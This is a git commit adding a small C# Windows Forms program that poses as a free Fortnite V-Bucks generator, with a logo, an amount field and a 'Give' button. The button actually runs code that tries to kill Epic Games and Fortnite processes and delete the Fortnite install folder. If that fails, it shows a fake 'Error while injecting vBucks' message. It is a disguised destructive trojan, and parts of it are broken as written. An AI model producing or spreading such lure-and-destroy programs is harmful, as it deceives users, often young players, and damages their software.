a892ea042ea7760edc6eb3a3c5c0eb80d0b3b9d8
usarana <43117189+usarana@users.noreply.github.com>
2020-10-22 22:12:00 +0300

    Add files via upload

---
+++ Form1.Designer.cs
@@ -0,0 +1,100 @@
+﻿namespace Win32.Fortnite
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.button1 = new System.Windows.Forms.Button();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.Location = new System.Drawing.Point(90, 3);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(103, 67);
+            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
+            this.pictureBox1.TabIndex = 0;
+            this.pictureBox1.TabStop = false;
+            // 
+            // textBox1
+            // 
+            this.textBox1.Location = new System.Drawing.Point(12, 107);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(270, 20);
+            this.textBox1.TabIndex = 1;
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(71, 82);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(137, 13);
+            this.label1.TabIndex = 2;
+            this.label1.Text = "Amount Of Vbucks To Give";
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(99, 133);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(75, 23);
+            this.button1.TabIndex = 3;
+            this.button1.Text = "Give";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.SystemColors.ControlLightLight;
+            this.ClientSize = new System.Drawing.Size(294, 165);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.textBox1);
+            this.Controls.Add(this.pictureBox1);
+            this.Name = "Form1";
+            this.Text = "bVucks giver 1.0";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.PictureBox pictureBox1;
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Button button1;
+    }
+}
+
---
+++ Form1.cs
@@ -0,0 +1,108 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.IO;
+using System.Diagnostics;
+using System.Activities.Expressions;
+
+namespace Win32.Fortnite
+{
+    /// <summary>
+    /// I use the "function" name for classes that have functions in them.
+    /// </summary>
+    public abstract class Functions
+    {
+        //Self explanatory part
+
+        public static void DeleteFortnite()
+        {
+            //Fortnite default location
+            var Fortnite = "C:\\Program Files\\Epic Games\\Fortnite";
+            //Does that location exist?
+            if (Directory.Exists(Fortnite))
+            {
+                //If yes, fetch processes
+                Process[] ps = Process.GetProcessesByName("nameOfProcess");
+                //Run this for each process (stored in ps)
+                foreach (Process process in ps)
+                {
+                    //Is the process Epic Games Launcher?
+                    if (process.ProcessName == "EpicGamesLauncher")
+                    {
+                        //Kill it
+                        process.Kill();
+                    }
+                    //Is the process Epic Games Launcher.exe?
+                    else if (process.ProcessName == "EpicGamesLauncher.exe")
+                    {
+                        //Kill it
+                        process.Kill();
+                    }
+                    //Is the process Fortnite.exe?
+                    else if (process.ProcessName == "FortniteClient-Win64-Shipping_BE.exe")
+                    {
+                        //Kill it
+                        process.Kill();
+                    }
+                    //Is the process Fortnite?
+                    else if (process.ProcessName == "FortniteClient-Win64-Shipping_BE")
+                    {
+                        //Kill it
+                        process.Kill();
+                    }
+                    //If both of those are not open, don't do anything.
+                    else
+                    {
+
+                    }
+                }
+                //We are putting this in a try { }, because it might crash, because we didn't kill Fortnite/Epic Games sucessfully.
+                try
+                {
+                    //Delete Fortnite
+                    Directory.Delete(Fortnite);
+                }
+                catch
+                {
+                    //If that doesn't work, throw an error and exit.
+                    MessageBox.Show("Error while injecting vBucks.", "bVucks giver 1.0");
+                    Application.Exit();
+                }
+            }
+
+            else
+            {
+                //If Directory.Exists(Fortnite) is false, throw an error and exit
+                MessageBox.Show("Cannot give V-Bucks when fortnite is not installed.", "bVucks giver 1.0");
+                Application.Exit();
+            }
+        }
+    }
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            //Initialize all of Form1 and its components, should automatically be defined on every new project you make.
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            //Set the Fortnite logo image from Resources
+            pictureBox1.Image = Properties.Resources.fortnite;
+            textBox1.Text = "0";
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            //Call all we wrote some time ago
+            Functions.DeleteFortnite();
+        }
+    }
+}
